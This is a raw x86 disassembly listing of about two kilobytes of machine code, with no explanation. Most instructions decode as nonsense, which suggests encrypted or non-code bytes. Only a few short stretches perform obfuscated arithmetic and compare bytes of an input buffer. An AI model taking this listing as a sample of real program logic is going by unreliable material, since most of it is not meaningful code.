  4141b1:	js     0x41415c
  4141b3:	xor    BYTE PTR [ebp+0x5f],ch
  4141b6:	leave  
  4141b7:	xchg   edi,eax
  4141b8:	sbb    ch,al
  4141ba:	lods   eax,DWORD PTR ds:[esi]
  4141bb:	mov    bh,BYTE PTR [ecx]
  4141bd:	in     eax,0xf9
  4141bf:	cmp    eax,0xf8f8db08
  4141c4:	sahf   
  4141c5:	jmp    0x832b:0x9697a60d
  4141cc:	fsubr  st,st(7)
  4141ce:	jmp    0xf828:0x17f08b38
  4141d5:	shl    DWORD PTR [edx],1
  4141d7:	sub    edi,esp
  4141d9:	xchg   esp,eax
  4141da:	jmp    0x671aaf49
  4141df:	into   
  4141e0:	out    dx,al
  4141e1:	out    dx,eax
  4141e2:	mov    eax,0x5bf4986b
  4141e7:	mov    al,ds:0xabcf4819
  4141ec:	adc    bh,dl
  4141ee:	ror    DWORD PTR [eax+0xa],1
  4141f1:	mov    dh,0x2a
  4141f3:	std    
  4141f4:	dec    edi
  4141f5:	fiadd  WORD PTR [eax-0x5af6fbb2]
  4141fb:	into   
  4141fc:	les    ebx,FWORD PTR [edi]
  4141fe:	in     eax,0x5b
  414200:	orps   xmm2,xmm7
  414203:	cwde   
  414204:	pop    esi
  414205:	cmp    edi,ecx
  414207:	call   0xd133:0x4933c239
  41420e:	aam    0xcb
  414210:	xor    DWORD PTR [edx],0x38
  414213:	sar    bh,0xd3
  414216:	inc    edx
  414217:	fistp  DWORD PTR [esi]
  414219:	out    dx,al
  41421a:	mov    al,0x8a
  41421c:	add    al,0xd4
  41421e:	pop    ebp
  41421f:	push   ss
  414220:	jmp    0x3ba9ed50
  414225:	call   0x93b2:0xeaaccac9
  41422c:	sti    
  41422d:	fisttp QWORD PTR [edx+0x286457c8]
  414233:	push   cs
  414234:	out    0x73,al
  414236:	mul    DWORD PTR [eax]
  414238:	icebp  
  414239:	and    BYTE PTR [ebx],0x6a
  41423c:	jmp    0x4141f9
  41423e:	ficomp WORD PTR [ecx+eax*4-0xf]
  414242:	adc    esp,DWORD PTR [ebx+0x32f47603]
  414248:	sar    BYTE PTR [edx-0x12],cl
  41424b:	xchg   edi,eax
  41424c:	xor    al,0x75
  41424e:	jmp    0x959bd6d6
  414253:	xchg   ebp,eax
  414254:	ret    0xfd87
  414257:	dec    eax
  414258:	inc    esi
  414259:	adc    dl,BYTE PTR [edx]
  41425b:	or     al,cl
  41425d:	cmc    
  41425e:	xchg   ebx,eax
  41425f:	cwde   
  414260:	xor    BYTE PTR [esi+0x4c],ch
  414263:	jnp    0x4141fc
  414265:	push   cs
  414266:	dec    DWORD PTR [esi+0x7d1bd308]
  41426c:	leave  
  41426d:	push   ebx
  41426e:	cli    
  41426f:	inc    esp
  414270:	fimul  WORD PTR [eax-0x41]
  414273:	sar    BYTE PTR [edi-0x91d0ff3],0x8c
  41427a:	sbb    al,0x6f
  41427c:	cmp    edx,DWORD PTR [edx]
  41427e:	push   esi
  41427f:	mov    ds:0x5844db62,al
  414284:	adc    DWORD PTR [edi-0x2b2f2e85],esp
  41428a:	fwait
  41428b:	inc    esp
  41428c:	or     DWORD PTR [ecx+0x3e1d4ffa],eax
  414292:	dec    edi
  414293:	fsubr  QWORD PTR [ebp-0x71]
  414296:	test   DWORD PTR ds:0xa3b7bb80,eax
  41429c:	adc    eax,0x8d6002cc
  4142a1:	std    
  4142a2:	popf   
  4142a3:	gs mov bh,0x41
  4142a6:	loop   0x41422e
  4142a8:	and    al,bh
  4142aa:	inc    edx
  4142ab:	fistp  WORD PTR [ecx-0x1d599dcb]
  4142b2:	jns    0x414266
  4142b4:	mov    BYTE PTR [ecx],al
  4142b6:	sbb    ah,0x32
  4142b9:	loopne 0x4142b0
  4142bb:	mov    cl,0x8d
  4142bd:	pop    edi
  4142be:	test   BYTE PTR [edx+0x24],cl
  4142c1:	adc    cl,BYTE PTR [edx]
  4142c3:	cli    
  4142c4:	jmp    0x81b4ed6
  4142c9:	jne    0x4142ad
  4142cb:	loop   0x414301
  4142cd:	hlt    
  4142ce:	das    
  4142cf:	and    esi,esi
  4142d1:	push   ss
  4142d2:	fistp  QWORD PTR [ebx-0x4f]
  4142d5:	sti    
  4142d6:	xor    DWORD PTR [ebx+0x7002717],ecx
  4142dc:	loopne 0x41430f
  4142de:	ror    DWORD PTR [ebx],cl
  4142e0:	mov    edx,esi
  4142e2:	xchg   esp,eax
  4142e3:	mov    bl,0x76
  4142e5:	inc    eax
  4142e6:	push   ecx
  4142e7:	sti    
  4142e8:	repz sub dl,BYTE PTR [ecx+ebx*8-0x65]
  4142ed:	pop    edx
  4142ee:	push   ebx
  4142ef:	add    DWORD PTR [ebp-0x6a],ebp
  4142f2:	fwait
  4142f3:	or     esi,DWORD PTR [esi-0x26e2b5c8]
  4142f9:	mov    edx,0x5bf6de9
  4142fe:	or     al,0x82
  414300:	push   eax
  414301:	fxch   st(4)
  414303:	inc    BYTE PTR [edi-0x54]
  414306:	mov    BYTE PTR [edx-0x7a0b654d],0xde
  41430d:	bound  ebx,QWORD PTR [eax]
  41430f:	out    dx,al
  414310:	xor    BYTE PTR [edi-0x111c98d4],ch
  414316:	jmp    0x414306
  414318:	fidivr DWORD PTR [eax]
  41431a:	popa   
  41431b:	daa    
  41431c:	mov    ds:0x926172d4,al
  414321:	ins    DWORD PTR es:[edi],dx
  414322:	es jecxz 0x41433e
  414325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414326:	mov    edx,0x3d2244f2
  41432b:	dec    ebp
  41432c:	push   0x39f7a054
  414331:	sbb    DWORD PTR [edx+0x46],eax
  414334:	xor    BYTE PTR [esp+ebx*8],ch
  414337:	and    bl,ah
  414339:	int    0xa9
  41433b:	xor    BYTE PTR [edi],dh
  41433d:	std    
  41433e:	push   edx
  41433f:	jns    0x414326
  414341:	add    eax,0x84a12a16
  414346:	push   ebp
  414347:	cli    
  414348:	daa    
  414349:	cmp    bl,BYTE PTR [edi+0x7854739]
  41434f:	lock mov ebp,0x836a93e0
  414355:	xchg   esi,eax
  414356:	add    eax,0x2ddee27e
  41435b:	pop    ds
  41435c:	jmp    0xbb2d:0xb7dbc50d
  414363:	jg     0x41431c
  414365:	cmp    BYTE PTR [ebx],0xbf
  414368:	jne    0x4143d0
  41436a:	test   eax,0xa5ffcf4d
  41436f:	test   al,0xe8
  414371:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  414373:	mov    ds:0x51802af0,al
  414378:	and    DWORD PTR [eax-0x40],edi
  41437b:	nop
  41437c:	xchg   edx,eax
  41437d:	or     DWORD PTR [edx+esi*2+0x48],0x29
  414382:	adc    bh,bh
  414384:	mov    dl,0xb0
  414386:	sbb    al,0x4
  414388:	call   0x609e71a1
  41438d:	adc    ebp,DWORD PTR [edx+0x2a]
  414390:	jmp    0x4143b2
  414392:	mov    ebp,0xa7e769b4
  414397:	jmp    0x3729:0xdc6f4650
  41439e:	inc    edi
  41439f:	xor    esp,edi
  4143a1:	scas   eax,DWORD PTR es:[edi]
  4143a2:	ins    DWORD PTR es:[edi],dx
  4143a3:	jg     0x4143b8
  4143a5:	fidiv  DWORD PTR [ebp+0x4ed6cdc5]
  4143ab:	jg     0x4143b6
  4143ad:	test   BYTE PTR [edx+ebx*1-0x1e],ch
  4143b1:	dec    edx
  4143b2:	mov    edx,0x3015be09
  4143b7:	xchg   ebx,eax
  4143b8:	and    ecx,edi
  4143ba:	idiv   dh
  4143bc:	sbb    eax,0x2bd75407
  4143c1:	xchg   DWORD PTR [eax+0x2ad3167d],edi
  4143c7:	rcr    DWORD PTR [ecx+edi*2+0x5aba1fed],0xdd
  4143cf:	mov    bh,BYTE PTR [eax-0x5c]
  4143d2:	int    0xcc
  4143d4:	out    0x6,al
  4143d6:	(bad)  
  4143d7:	scas   al,BYTE PTR es:[edi]
  4143d8:	or     ebx,eax
  4143da:	inc    ebp
  4143db:	daa    
  4143dc:	xor    al,0x47
  4143de:	fsubp  st(4),st
  4143e0:	xchg   cx,ax
  4143e2:	jecxz  0x4143e7
  4143e4:	int3   
  4143e5:	inc    edi
  4143e6:	fsubr  DWORD PTR [edx+0x69]
  4143e9:	out    0x7a,eax
  4143eb:	cmp    DWORD PTR [eax+edi*4],ecx
  4143ee:	ror    edi,0xd8
  4143f1:	in     al,0x6c
  4143f3:	call   DWORD PTR [ebx+esi*1+0x21]
  4143f7:	repz and al,0x8a
  4143fa:	bound  ebx,QWORD PTR [ebp-0x5c]
  4143fd:	test   eax,0x63b21c79
  414402:	daa    
  414403:	fwait
  414404:	sar    ebp,0x3c
  414407:	ret    
  414408:	rcl    edi,0x75
  41440b:	pusha  
  41440c:	sub    ecx,DWORD PTR [ebx+0x40ff7ded]
  414412:	fldcw  WORD PTR [edx-0x2e48255a]
  414418:	fidivr WORD PTR [ebx-0x77c907ee]
  41441e:	aam    0xad
  414420:	aam    0xd8
  414422:	add    ah,BYTE PTR [ecx-0x100cecbb]
  414428:	cwde   
  414429:	and    eax,DWORD PTR [edx]
  41442b:	fs dec esi
  41442d:	test   dl,dl
  41442f:	sub    dh,BYTE PTR [ecx+0x7b4a3dee]
  414435:	enter  0xc819,0x6e
  414439:	adc    esp,eax
  41443b:	sti    
  41443c:	fs xor eax,0xe1e40657
  414442:	rol    DWORD PTR ds:[edi],cl
  414445:	shl    DWORD PTR gs:[eax+0x62b5073f],1
  41444c:	test   DWORD PTR [ebp+0x6a2f42f2],edi
  414452:	mov    edx,0xbcdd486f
  414457:	dec    eax
  414458:	sbb    ah,BYTE PTR [esi]
  41445a:	arpl   WORD PTR [ebp+0x4b],cx
  41445d:	loope  0x4143f5
  41445f:	cmp    eax,0x586e4cb5
  414464:	sbb    edi,DWORD PTR ds:0x4d700c0b
  41446a:	pop    ebp
  41446b:	push   edx
  41446c:	lods   al,BYTE PTR ds:[esi]
  41446d:	mov    ebx,0xe5b6d8b8
  414472:	mov    dh,bh
  414474:	pop    edi
  414475:	js     0x41440e
  414477:	not    DWORD PTR fs:[ebp+0x19]
  41447b:	inc    esp
  41447c:	cmp    DWORD PTR [edi+0xb2c3d42],ebp
  414482:	call   0x8732:0xfddf6a8d
  414489:	xor    al,0x8a
  41448b:	or     eax,0x952816cb
  414490:	jbe    0x414482
  414492:	lods   al,BYTE PTR ds:[esi]
  414493:	push   ebp
  414494:	xchg   esi,eax
  414495:	es repz push esp
  414498:	mov    BYTE PTR [edx-0x4f],cl
  41449b:	loop   0x41449d
  41449d:	mov    esi,0xd8802785
  4144a2:	stc    
  4144a3:	call   DWORD PTR [edi]
  4144a5:	sbb    DWORD PTR [edx+0x6d],0x64
  4144a9:	dec    eax
  4144aa:	inc    esi
  4144ab:	scas   eax,DWORD PTR es:[edi]
  4144ac:	mov    ds:0x51b1867a,eax
  4144b1:	push   esp
  4144b2:	pop    ds
  4144b3:	xchg   edx,eax
  4144b4:	mov    cl,0x6
  4144b6:	hlt    
  4144b7:	jmp    0x3b5c1f96
  4144bc:	and    dl,BYTE PTR [edx]
  4144be:	and    DWORD PTR [edx],edi
  4144c0:	retf   
  4144c1:	add    ebp,DWORD PTR [ecx]
  4144c3:	sub    eax,0xd8f4e1e1
  4144c8:	push   edi
  4144c9:	(bad)
  4144cd:	and    ch,BYTE PTR [edi-0x1d]
  4144d0:	cmp    eax,0xb405ef84
  4144d5:	into   
  4144d6:	push   edx
  4144d7:	std    
  4144d8:	adc    al,0x8b
  4144da:	out    0xd,al
  4144dc:	(bad)  
  4144dd:	jecxz  0x414492
  4144df:	or     ecx,DWORD PTR [edx+eax*1-0x4574d6c7]
  4144e6:	mov    edi,0xcea4a8c8
  4144eb:	outs   dx,BYTE PTR ds:[esi]
  4144ec:	rcl    BYTE PTR ds:0x9aba3fe1,cl
  4144f2:	pop    ss
  4144f3:	jp     0x4144e4
  4144f5:	ror    BYTE PTR [edx-0x43],0xd0
  4144f9:	push   cs
  4144fa:	inc    ebp
  4144fb:	pusha  
  4144fc:	mov    edi,ds
  4144fe:	sub    al,0x4
  414500:	add    al,0x27
  414502:	mov    bh,BYTE PTR [esi-0x5]
  414505:	mov    esi,0x7b5920c8
  41450a:	dec    ebp
  41450b:	mov    DWORD PTR [ebp-0x8],0x3204
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x737c:0x73623c4c
  414595:	out    0xd1,al
  414597:	jo     0x41456b
  414599:	and    al,0x18
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    BYTE PTR [esi+0x22],dl
  4145a2:	icebp  
  4145a3:	xor    BYTE PTR [ebx],dl
  4145a5:	repz int3 
  4145a7:	or     BYTE PTR [esi-0x343345db],ah
  4145ad:	add    cl,bh
  4145af:	mov    edi,edx
  4145b1:	ins    BYTE PTR es:[edi],dx
  4145b2:	jno    0x4145aa
  4145b4:	sbb    bh,bh
  4145b6:	stos   BYTE PTR es:[edi],al
  4145b7:	popf   
  4145b8:	(bad)  
  4145b9:	ja     0x414562
  4145bb:	(bad)  
  4145bc:	and    ebx,edx
  4145be:	test   eax,0x94d8222e
  4145c3:	and    DWORD PTR [ecx+0x44],0xffffffbb
  4145c7:	call   0x4f8:0x4dc53ca9
  4145ce:	and    cl,BYTE PTR [esi]
  4145d0:	sub    eax,0x9f04786c
  4145d5:	mov    dl,bl
  4145d7:	repnz ins DWORD PTR es:[edi],dx
  4145d9:	mov    ebp,0x191b2802
  4145de:	imul   ecx,edi,0xb
  4145e1:	sbb    al,0xce
  4145e3:	out    dx,al
  4145e4:	popf   
  4145e5:	(bad)  
  4145e6:	clc    
  4145e7:	in     al,0xd4
  4145e9:	jmp    0xe191:0xdbcf87a5
  4145f0:	ficomp WORD PTR [eax+0x4e9e46c3]
  4145f6:	cmc    
  4145f7:	ins    DWORD PTR es:[edi],dx
  4145f8:	xchg   ebx,eax
  4145f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145fa:	and    DWORD PTR [edx-0x43],edx
  4145fd:	xchg   edx,eax
  4145fe:	adc    esp,DWORD PTR [edx+eiz*4]
  414601:	stos   BYTE PTR es:[edi],al
  414602:	dec    ecx
  414603:	mov    ebx,0xf6fd847f
  414608:	jae    0x414646
  41460a:	ss cmp eax,0x22c4b1db
  414610:	les    esi,FWORD PTR [esi+edx*1]
  414613:	xor    dh,BYTE PTR [ebp-0x44c01b3c]
  414619:	arpl   sp,si
  41461b:	repnz mov edi,0xd2babfa
  414621:	ror    BYTE PTR [ecx-0x7],1
  414624:	in     eax,0xba
  414626:	iret   
  414627:	push   cs
  414628:	nop
  414629:	adc    DWORD PTR [ebx],ebp
  41462b:	push   esi
  41462c:	les    ebx,FWORD PTR [ecx-0x19]
  41462f:	mov    ebx,0xf3c6bc12
  414634:	mov    ebp,0x31fb2400
  414639:	cdq    
  41463a:	adc    DWORD PTR [ecx+0x6d2807ad],ebx
  414640:	mov    ds:0x5c98045c,al
  414645:	pop    ss
  414646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414647:	mov    edx,0xd755a039
  41464c:	sti    
  41464d:	xchg   edx,ebx
  41464f:	cmp    al,BYTE PTR [ecx+0x66b896bc]
  414655:	mov    ch,0xd4
  414657:	xor    al,BYTE PTR [ebx]
  414659:	mov    ah,0x43
  41465b:	ins    BYTE PTR es:[edi],dx
  41465c:	cmp    ch,BYTE PTR [ebx+0x3e]
  41465f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414660:	dec    edi
  414661:	add    BYTE PTR [ecx+eax*1-0x11],ch
  414665:	jnp    0x4146af
  414667:	dec    edx
  414668:	lods   eax,DWORD PTR ds:[esi]
  414669:	jmp    FWORD PTR [edi-0x4c]
  41466c:	jl     0x414630
  41466e:	aam    0x50
  414670:	cld    
  414671:	dec    esi
  414672:	mov    ah,0xe7
  414674:	aad    0x87
  414676:	inc    ebp
  414677:	stos   BYTE PTR es:[edi],al
  414678:	daa    
  414679:	js     0x414615
  41467b:	sahf   
  41467c:	inc    ecx
  41467d:	dec    edx
  41467e:	out    0x7e,al
  414680:	jmp    0x8e8bf9c5
  414685:	or     BYTE PTR [ebp-0x64],ch
  414688:	fsubr  st,st(6)
  41468a:	mov    eax,ds:0xb4344e68
  41468f:	ror    dl,cl
  414691:	or     al,0x43
  414693:	aam    0x6e
  414695:	jns    0x4146be
  414697:	mov    ah,0xa7
  414699:	iret   
  41469a:	adc    BYTE PTR [ebx-0x7ef3f090],bl
  4146a0:	sbb    eax,0x56b59145
  4146a5:	dec    esp
  4146a6:	sub    dh,BYTE PTR es:[esi+0x48b8b242]
  4146ad:	mov    BYTE PTR [eax],dh
  4146af:	mov    esp,0xafa9b271
  4146b4:	pop    edx
  4146b5:	and    bh,BYTE PTR [esi]
  4146b7:	jl     0x414708
  4146b9:	xor    edi,DWORD PTR [edx]
  4146bb:	icebp  
  4146bc:	push   ds
  4146bd:	stos   BYTE PTR es:[edi],al
  4146be:	push   esp
  4146bf:	dec    edx
  4146c0:	popf   
  4146c1:	mov    ds:0xbcacf775,al
  4146c6:	aas    
  4146c7:	inc    ebp
  4146c8:	mov    es,WORD PTR [ecx]
  4146ca:	repz sbb ecx,0xfffffff2
  4146ce:	adc    al,0xad
  4146d0:	pop    edx
  4146d1:	pop    ss
  4146d2:	lds    esi,FWORD PTR [edx+ebx*4-0x61]
  4146d6:	sar    ch,cl
  4146d8:	stos   BYTE PTR es:[edi],al
  4146d9:	imul   ecx,DWORD PTR [eax+0x2dd85500],0x9bcc9a88
  4146e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146e4:	mov    esp,0x9ec56842
  4146e9:	shl    ebp,0xc
  4146ec:	mov    esi,0xd81211dd
  4146f1:	sahf   
  4146f2:	push   edx
  4146f3:	mov    esi,0x16b14128
  4146f8:	add    ebx,DWORD PTR [ecx+eax*8+0x6619101]
  4146ff:	sub    al,0x89
  414701:	sbb    ch,BYTE PTR [edi-0x2]
  414704:	add    BYTE PTR [esi],al
  414706:	pop    ebp
  414707:	mov    esi,0xa6803410
  41470c:	addr16 aaa 
  41470e:	and    DWORD PTR [eax+edx*4+0x2860c70],0x8d339f68
  414719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41471a:	push   esi
  41471b:	xor    edx,DWORD PTR [esi]
  41471d:	loope  0x414722
  41471f:	or     BYTE PTR [ebx+0x44],bl
  414722:	rol    BYTE PTR [edx+0x56],1
  414725:	leave  
  414726:	pop    ebx
  414727:	push   ebp
  414728:	push   esi
  414729:	test   al,0xae
  41472b:	test   BYTE PTR [ebp-0x27d09f60],0xc6
  414732:	cmc    
  414733:	push   0xf5d9c064
  414738:	out    dx,al
  414739:	mov    ebx,0x40d4d71a
  41473e:	pusha  
  41473f:	(bad)  
  414740:	and    DWORD PTR [ebx],ebx
  414742:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414744:	pushf  
  414745:	cli    
  414746:	cmp    al,BYTE PTR [esi+0x63b48f36]
  41474c:	les    edi,FWORD PTR [edx]
  41474e:	pop    ecx
  41474f:	pop    es
  414750:	cld    
  414751:	out    dx,al
  414752:	sub    al,bh
  414754:	xlat   BYTE PTR ds:[ebx]
  414755:	fist   WORD PTR [ecx+0x29cd669c]
  41475b:	int    0x2e
  41475d:	test   al,0x84
  41475f:	add    DWORD PTR [ecx-0x15],edx
  414762:	stos   BYTE PTR es:[edi],al
  414763:	xchg   ebx,eax
  414764:	or     ecx,DWORD PTR [esp+ecx*2+0x63]
  414768:	inc    edx
  414769:	add    al,0xeb
  41476b:	jmp    FWORD PTR [ecx-0x4ce62cfa]
  414771:	stos   BYTE PTR es:[edi],al
  414772:	and    BYTE PTR [ecx+0x3f],0x2d
  414776:	push   esp
  414777:	call   0x2c5b29af
  41477c:	pushf  
  41477d:	mov    esp,0x41fb84ab
  414782:	outs   dx,BYTE PTR ds:[esi]
  414783:	cmp    al,0x43
  414785:	sbb    ah,ah
  414787:	inc    eax
  414788:	aaa    
  414789:	dec    ecx
  41478a:	sbb    ah,cl
  41478c:	push   esi
  41478d:	fcomp  QWORD PTR [ebx-0x5c]
  414790:	xchg   ebp,eax
  414791:	mov    ah,0xf4
  414793:	scas   eax,DWORD PTR es:[edi]
  414794:	mov    ch,0x62
  414796:	mov    dh,0x8e
  414798:	mov    al,ds:0x6f5b4fb5
  41479d:	(bad)  
  41479e:	data16 mov ch,0x79
  4147a1:	jb     0x414724
  4147a3:	mov    ch,0xb9
  4147a5:	outs   dx,BYTE PTR ds:[esi]
  4147a6:	addr16 sub al,0x1d
  4147a9:	mov    ds,WORD PTR [ebx-0x7]
  4147ac:	xor    BYTE PTR [edi],dh
  4147ae:	hlt    
  4147af:	out    0x8a,al
  4147b1:	jecxz  0x414750
  4147b3:	mov    eax,DWORD PTR [esi+ebx*2+0x5de4ec1b]
  4147ba:	dec    esi
  4147bb:	or     DWORD PTR ds:[esi+0x76],edx
  4147bf:	fs aas 
  4147c1:	adc    ah,BYTE PTR [ecx]
  4147c3:	mov    bl,0xd9
  4147c5:	mov    cl,0xa9
  4147c7:	inc    edi
  4147c8:	sbb    esp,DWORD PTR [ecx-0x37d589fb]
  4147ce:	lods   al,BYTE PTR ds:[esi]
  4147cf:	mov    cl,0x32
  4147d1:	into   
  4147d2:	out    0x88,eax
  4147d4:	aaa    
  4147d5:	xchg   edi,eax
  4147d6:	pop    ebx
  4147d7:	mov    ds:0xee1f98dc,al
  4147dc:	lods   eax,DWORD PTR ds:[esi]
  4147dd:	or     al,0x32
  4147df:	ins    WORD PTR es:[edi],dx
  4147e1:	xor    BYTE PTR cs:[ecx+0x47],ch
  4147e5:	mov    bh,bh
  4147e7:	enter  0xab39,0x6d
  4147eb:	(bad)  
  4147ec:	sbb    DWORD PTR [eax+0x6a],esi
  4147ef:	js     0x414780
  4147f1:	and    eax,0x87595108
  4147f6:	pop    DWORD PTR [edi+eax*8+0x5ff90426]
  4147fd:	(bad)  
  4147fe:	cdq    
  4147ff:	sbb    cl,BYTE PTR [ebp-0x2e80895]
  414805:	imul   esp,esp,0x25687518
  41480b:	out    0x12,eax
  41480d:	nop
  41480e:	scas   eax,DWORD PTR es:[edi]
  41480f:	mov    cl,0x54
  414811:	mov    ebx,0x637c4405
  414816:	push   esi
  414817:	cld    
  414818:	sbb    al,0x40
  41481a:	and    bl,BYTE PTR [ecx+0x32617971]
  414820:	lea    esi,[edi]
  414822:	sbb    BYTE PTR [edx+0x411cb0df],0xf8
  414829:	jo     0x41480d
  41482b:	xchg   edx,eax
  41482c:	xor    cl,BYTE PTR [eax]
  41482e:	aam    0x6b
  414830:	mov    ds:0x87b3c33e,al
  414835:	and    esp,edi
  414837:	or     DWORD PTR [ebx+ecx*8+0x6d68880a],0xdc1fba84
  414842:	aas    
  414843:	inc    ecx
  414844:	dec    ebx
  414845:	ficom  WORD PTR [edx+0x2a]
  414848:	pushf  
  414849:	stos   DWORD PTR es:[edi],eax
  41484a:	push   eax
  41484b:	jbe    0x414852
  41484d:	inc    ebp
  41484e:	fsub   QWORD PTR [ecx-0x2a1d62ce]
  414854:	nop
  414855:	or     al,0xfb
  414857:	jge    0x4148a2
  414859:	rcr    BYTE PTR [eax-0x52],0x7e
  41485d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41485e:	imul   ebp,DWORD PTR [edx],0x97e3607
  414864:	rol    BYTE PTR ds:0xc413ddc2,0x34
  41486b:	loop   0x414856
  41486d:	inc    ecx
  41486e:	ja     0x4148e3
  414870:	test   DWORD PTR [eax+0x779aa723],edx
  414876:	mov    ecx,0xf12fc5de
  41487b:	inc    ecx
  41487c:	sahf   
  41487d:	fdivr  DWORD PTR [edi]
  41487f:	push   ebp
  414880:	inc    eax
  414881:	jmp    0x9123bbef
  414886:	lods   eax,DWORD PTR ds:[esi]
  414887:	jo     0x5821089f
  41488d:	mov    cl,BYTE PTR [edi]
  41488f:	dec    ecx
  414890:	mov    ebx,0x2398fbe8
  414895:	das    
  414896:	pop    ebp
  414897:	lods   eax,DWORD PTR ds:[esi]
  414898:	hlt    
  414899:	xchg   BYTE PTR [ebx+0x77],dh
  41489c:	mov    WORD PTR [edi-0xe1e8a29],?
  4148a2:	call   0x9926474b
  4148a7:	cld    
  4148a8:	outs   dx,DWORD PTR ds:[esi]
  4148a9:	pushf  
  4148aa:	dec    esi
  4148ab:	dec    edi
  4148ac:	dec    ebp
  4148ad:	dec    ebx
  4148ae:	hlt    
  4148af:	jns    0x4148b6
  4148b1:	test   esp,0xae6625b0
  4148b7:	(bad)  
  4148b8:	loop   0x4148e1
  4148ba:	(bad)  
  4148bc:	xor    eax,DWORD PTR [ebp+0x10]
  4148bf:	lods   al,BYTE PTR ds:[esi]
  4148c0:	xor    BYTE PTR ds:[edi+0x73c75e3c],dl
  4148c7:	les    edx,FWORD PTR [edx-0x1e]
  4148ca:	push   esp
  4148cb:	mov    al,0x86
  4148cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ce:	xlat   BYTE PTR ds:[ebx]
  4148cf:	sbb    al,BYTE PTR [esi+0x382603f3]
  4148d5:	call   0xea8:0xb5c65abc
  4148dc:	push   esp
  4148dd:	dec    esi
  4148de:	shl    BYTE PTR [eax],cl
  4148e0:	adc    DWORD PTR [ebx+0x4a],0x353792b6
  4148e7:	mov    bh,0xfa
  4148e9:	pop    eax
  4148ea:	pop    eax
  4148eb:	and    BYTE PTR [ecx-0x64],cl
  4148ee:	ficom  DWORD PTR [edx+0x37]
  4148f1:	out    0xda,al
  4148f3:	ret    0x98f1
  4148f6:	mov    esp,0x166b3a31
  4148fb:	(bad)  
  4148fc:	push   ebp
  4148fd:	shl    ecx,cl
  4148ff:	pop    edi
  414900:	call   0x9dd71eb0
  414905:	push   ebx
  414906:	dec    ebp
  414907:	and    DWORD PTR [esi+esi*8-0x5f],eax
  41490b:	mov    ax,0x500f
  41490f:	popa   
  414910:	push   0xb76c6891
  414915:	add    esi,ecx
  414917:	inc    edi
  414918:	or     esi,edi
  41491a:	xchg   BYTE PTR [edx+ebx*2],al
  41491d:	jae    0x4148a3
  41491f:	push   0xffffffe6
  414921:	jo     0x414932
  414923:	cs sti 
  414925:	adc    BYTE PTR [eax-0x74],bl
  414928:	in     al,0x24
  41492a:	ret    0xc428
  41492d:	scas   eax,DWORD PTR es:[edi]
  41492e:	jmp    0x5f9f:0x34b79f16
  414935:	imul   ebp,DWORD PTR [esp+edx*2-0x70],0x6df3a10b
  41493d:	or     al,0x9
  41493f:	cdq    
  414940:	xchg   ebp,eax
  414941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414942:	dec    edx
  414943:	int    0x40
  414945:	int    0x8
  414947:	add    cl,BYTE PTR [ebx-0x74703b3]
  41494d:	out    dx,eax
  41494e:	(bad)  
  41494f:	dec    DWORD PTR [ebx+0x3d12bd0]
  414955:	push   ebp
  414956:	clc    
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x79
  414996:	xchg   edi,eax
  414997:	xchg   edi,eax
  414998:	mov    esp,0x18181c8b
  41499d:	rcl    BYTE PTR [edx],1
  41499f:	sbb    BYTE PTR [eax],bl
  4149a1:	inc    eax
  4149a2:	loop   0x4149b6
  4149a4:	(bad)  
  4149a6:	fadd   DWORD PTR [ebp-0x6b]
  4149a9:	xor    al,0xb5
  4149ab:	stos   BYTE PTR es:[edi],al
  4149ac:	sbb    DWORD PTR [edx+0x66],0xffffffeb
  4149b0:	iret   
  4149b1:	jecxz  0x414a01
  4149b3:	mov    esi,0xd0653a1b
  4149b8:	dec    ecx
  4149b9:	mov    edx,0xa832f67b
  4149be:	jno    0x4149d8
  4149c0:	xchg   dh,dh
  4149c2:	xor    ecx,ecx
  4149c4:	push   ecx
